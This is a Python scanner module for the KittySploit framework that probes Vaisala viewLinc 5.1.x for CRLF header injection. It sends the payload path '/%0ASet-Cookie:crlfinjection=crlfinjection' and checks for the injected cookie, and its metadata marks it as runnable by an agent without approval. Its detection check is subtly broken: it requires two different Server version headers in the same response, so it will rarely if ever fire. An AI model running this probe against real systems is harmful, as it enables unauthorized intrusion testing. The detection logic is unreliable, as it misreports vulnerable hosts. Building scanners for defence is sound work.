#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""viewLinc 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'viewLinc 5.1.2.367 - Carriage Return Line Feed Attack Detection',
        'description': 'viewLinc 5.1.2.367 (and sometimes 5.1.1.50) allows remote attackers to inject a carriage return line feed (CRLF) character into the responses returned by the product, which allows attackers to inject arbitrary HTTP headers into the response returned.',
        'author': ['KittySploit Team'],
        'severity': 'low',
        'tags': ['web', 'scanner', 'vulnerability', 'crlf', 'viewlinc', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.vaisala.com/en/products/systems/indoor-monitoring-systems/viewlinc-continuous-monitoring-system',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/%0ASet-Cookie:crlfinjection=crlfinjection', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('Server: viewLinc/5.1.2.367', 'Set-Cookie: crlfinjection=crlfinjection', 'Server: viewLinc/5.1.1.50',)
        if (all(m in headers for m in header_all)):
            self.set_info(
                severity='low',
                reason="viewLinc 5.1.2.367 - Carriage Return Line Feed Attack detected",
                path='/%0ASet-Cookie:crlfinjection=crlfinjection',
            )
            return True
        return False

